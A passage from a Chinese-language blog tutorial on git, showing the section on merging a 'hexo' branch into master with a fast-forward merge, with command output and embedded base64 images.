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" alt></p>
<h2 id="0x02-合并分支"><a href="#0x02-合并分支" class="headerlink" title="0x02 合并分支"></a>0x02 合并分支</h2><p>我们切换回master</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>



<p>这里注意一下是<strong>谁合并到谁</strong>的逻辑：</p>
<p>master把hexo合并过来 == hexo变成现在master的一个&lt;同一结点&gt;or&lt;父节点&gt;</p>
<h3 id="0x21-hexo创建后，master没有再次提交（同一节点）"><a href="#0x21-hexo创建后，master没有再次提交（同一节点）" class="headerlink" title="0x21 hexo创建后，master没有再次提交（同一节点）"></a>0x21 hexo创建后，master没有再次提交（同一节点）</h3><p>将hexo分支的工作成果合并到master分支上，也就是git中的<code>Fast-forward</code>模式，合并速度非常快</p>
<p>因为这里master之后没有commit，所以直接是master指针移动到hexo指针所指位置，指向同一结点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge hexo</span></span><br><span class="line">Updating b4d9c9a..1405868</span><br><span class="line">Fast-forward</span><br><span class="line"> x.txt | 2 +-</span><br><span class="line"> y.txt | 0</span><br><span class="line"> 2 files changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"> create mode 100644 y.txt</span><br></pre></td></tr></table></figure>

<p><img src="data:image/png;base64,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